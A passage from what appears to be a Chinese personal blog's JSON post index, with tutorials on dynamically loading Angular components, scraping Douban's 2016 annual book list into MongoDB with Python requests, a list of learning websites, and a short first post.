text而已，并且导出一个 TextComponent 这个类，我们之后会用到第四步接下来就开始进行加载了1234567891011121314151617181920212223242526import &#123;Component, ComponentFactoryResolver, ViewChild, &#125; from '@angular/core';import &#123;TextComponent&#125; from \"./text.component\";import &#123;DynamicComponentDirective&#125; from './dynamic-component.directive'@Component(&#123; selector: 'app-root', templateUrl: './app.component.html', styleUrls: ['./app.component.css'], entryComponents: [TextComponent]&#125;)export class AppComponent &#123; @ViewChild(DynamicComponentDirective) componentHost: DynamicComponentDirective; constructor(private componentFactoryResolver: ComponentFactoryResolver)&#123;&#125; CreateGroup()&#123; const componentFactory = this.componentFactoryResolver.resolveComponentFactory(TextComponent) const viewContainerRef = this.componentHost.viewContainerRef; viewContainerRef.clear(); const componentRef = viewContainerRef.createComponent(componentFactory); &#125;&#125; 首先我们看到在@Component这个装饰器里面多了一个entryComponents，意思是当加载了当前组件之后，告诉编译器去编译entryComponents数组里面的组件，之后就能给下一步使用了。然后我们看 AppComponent这个类它有一个@ViewChild装饰器，这个装饰器是用来访问一个类和这个类的方法的，访问的是DynamicComponentDIrective这个类，我们在第一步就创建了然后就是注入一个ComponentFactoryResolver这个类，好像是对组件进行处理，viewContainerRef这个变量赋值为 我们在DynamicComponentDirective里面的viewContainerRef。最后调用方法 viewContainerRef.createComponent(componentFactory)实例化组件，到这里还没完，我们要把用到的组件在 app.module.ts里面声明最后12345678910111213141516171819202122232425262728import &#123; BrowserModule &#125; from '@angular/platform-browser';import &#123; NgModule &#125; from '@angular/core';import &#123; AppComponent &#125; from './app.component';import &#123; FormsModule &#125; from '@angular/forms'import &#123; WeUIModule&#125; from 'angular-weui'import &#123;TextComponent&#125; from \"./text.component\";import &#123;DynamicComponentDirective&#125; from \"./dynamic-component.directive\";@NgModule(&#123; declarations: [ AppComponent, TextComponent, DynamicComponentDirective ], imports: [ BrowserModule, FormsModule, WeUIModule ], entryComponents: [ TextComponent ], providers: [], bootstrap: [AppComponent]&#125;)export class AppModule &#123; &#125; 顺带一提我用的css样式123456789.clearfix &#123; *zoom: 1;&#125;.clearfix:after&#123; content: \"\"; display: block; height: 0; visibility:hidden; clear: both;&#125;#header&#123; width: 96%; height: 90px; margin: 0 auto; background: #f60;&#125;#body&#123; width: 96%; margin: 0 auto; clear: both;&#125;#left&#123; float: left; width: 50%; background: #ccc;float: left&#125;#right&#123; margin-left: 50%; background: orange; overflow: hidden; position: fixed;&#125; 效果图在没点击按钮的时候 之前 点击按钮之后 之后 总结其实一开始我是摸不着头脑的，不知道要怎么动态加载组件，上网找了好久也找不到，之后也是看别人的代码一步一步试才懂得，这个动态加载组件只是入门，我再挖掘一下其他用法","categories":[{"name":"前端","slug":"前端","permalink":"https://recallhyx.github.io/categories/前端/"}],"tags":[{"name":"angular2","slug":"angular2","permalink":"https://recallhyx.github.io/tags/angular2/"}]},{"title":"python爬取动态页面","slug":"python爬取动态页面","date":"2017-04-28T11:10:12.000Z","updated":"2018-01-27T07:03:09.408Z","comments":true,"path":"2017/04/28/python爬取动态页面/","link":"","permalink":"https://recallhyx.github.io/2017/04/28/python爬取动态页面/","excerpt":"先水一下终于有空来写博客了，这个月有点忙（有点懒），好了，进入正题今天是要来记录一下 python动态爬取页面的，我们要爬取的页面就是豆瓣2016年度榜单","text":"先水一下终于有空来写博客了，这个月有点忙（有点懒），好了，进入正题今天是要来记录一下 python动态爬取页面的，我们要爬取的页面就是豆瓣2016年度榜单 豆瓣2016年度榜单页面 让我们看一下源代码，按 F12 界面 可以看到，这些页面会随着你滚轮的滚动动态加载，加载的内容也不一样，我们要做的，就是找出加载的文件 下一步 先点击 Network ，跳转到另外一个界面，随着滚轮滚动，我们可以看到，有一些东西不断被加载出来，名字是用数字编号的文件，点击看一下，发现没有，我们要找的东西就在这里！一开始我是以为这些文件全都是保存各个书信息的json，用一个循环可以直接找出我们要的信息，点了其他几个文件才发现，其实不是的 这些带数字的文件还保存着其他我们不要的信息，也没差，就是加个判断条件而已，那这个判断条件要怎么写呢？注意到 json 里面有一个 key： kind_cn，我们可以用这个来判断由于豆瓣这个年度榜单没有页码，我们就手动滚到最底部（或者滚到你想要的位置）然后查看对应的数字文件来找到对应的页码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273import requestsimport json#引入MongoDBfrom pymongo import MongoClient#MongoDB的操作，我们会在其他博文细讲client = MongoClient()db = client['Books']book_collection = db['book']book_title = ''book_score = ''title = ''book_count = ''book_url = ''# IP = ''.join(\"113.107.112.210:8101\".strip())# proxy=&#123;'http':IP&#125;# 协议头headers = &#123; 'User-Agent': \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1\",&#125; ##浏览器请求头（大部分网站没有这个请求头会报错、请务必加上哦）url = 'https://book.douban.com/ithil_j/activity/book_annual2016/widget/'page = 1#这里的 39 就是我自己想找的最后一个页面的数字while page&lt;=39: #requests包的用法，把我们之前构造好的 url 和 页码 进行拼接，才能够爬到下一个页面，关于 requests，我会在其他博文细讲 data = requests.get(url+str(page),headers=headers) #请求页面返回后的 json 我们用 json.loads() 这个方法，把它变成python里面的字典类型，关于json，我会在其他博文细讲 value = json.loads(data.text) #进行判断，如果是书摘的话，就跳过 if value['res']['kind_cn']==u'书摘': page+=1 continue #这里面还有一个分支，有一些是 top 10 ，有一些是 top 5 if value['res']['kind_str']=='top10': for i in range(0,10): book_title=value['res']['subjects'][i]['title'] book_score=value['res']['subjects'][i]['rating'] book_count = value['res']['subjects'][i]['rating_count'] book_url = value['res']['subjects'][i]['url'] title = value['res']['payload']['title'] post = &#123; '主题':title, '书名':book_title, '评分':book_score, '评分人数':book_count, '链接':book_url &#125; book_collection.save(post) # print(book_title) # print(book_score) # print(book_count) # print(book_url) # print(title) if value['res']['kind_str']=='top5': for i in range(0,5): book_title=value['res']['subjects'][i]['title'] book_score=value['res']['subjects'][i]['rating'] book_count = value['res']['subjects'][i]['rating_count'] book_url = value['res']['subjects'][i]['url'] title = value['res']['payload']['title'] post = &#123; '主题':title, '书名':book_title, '评分':book_score, '评分人数':book_count, '链接':book_url &#125; book_collection.save(post) print('第'+ str(page) +'页爬取完毕') # print(value) page+=1 最终就是这样啦，上面的代码就是全部了，其实还能把一些东西抽出来作为函数，但是我还是挺忙的（懒）所以留给读者去做了，可能以后还会更新，看吧，哈哈哈上面有一些东西是需要细讲的，比如，json啊，MongoDB啊，我会另写博文，多多关注呀","categories":[{"name":"后端","slug":"后端","permalink":"https://recallhyx.github.io/categories/后端/"}],"tags":[{"name":"python","slug":"python","permalink":"https://recallhyx.github.io/tags/python/"}]},{"title":"一些有用的网站","slug":"一些有用的网站","date":"2017-04-08T07:50:07.000Z","updated":"2017-04-09T07:23:10.881Z","comments":true,"path":"2017/04/08/一些有用的网站/","link":"","permalink":"https://recallhyx.github.io/2017/04/08/一些有用的网站/","excerpt":"学习用的网站菜鸟教程:这个网站几乎包含了所有关于编程语言的新手入门教程和很多有用的工具，想要学习一门新的语言可以上这个网站","text":"学习用的网站菜鸟教程:这个网站几乎包含了所有关于编程语言的新手入门教程和很多有用的工具，想要学习一门新的语言可以上这个网站安卓Api:这个网站是官网的api，虽然全，但是藏的比较深，就贴出来了 Android 廖雪峰的官方网站:非常有用的网站，里面的教程也是适合新手和进阶的，而且评论区也挺热闹，老师也会回答你提出来的问题","categories":[],"tags":[{"name":"学习","slug":"学习","permalink":"https://recallhyx.github.io/tags/学习/"}]},{"title":"FirstBlog","slug":"FirstBlog","date":"2017-04-07T06:39:39.000Z","updated":"2017-04-09T07:24:06.429Z","comments":true,"path":"2017/04/07/FirstBlog/","link":"","permalink":"https://recallhyx.github.io/2017/04/07/FirstBlog/","excerpt":"","text":"你好呀，我是Recall，这是我的第一篇博客 我想知道要怎么写1print(\"Hello World\")","categories":[],"tags":[{"name":"first","slug":"first","permalink":"https://recallhyx.github.io/tags/first/"}]}]}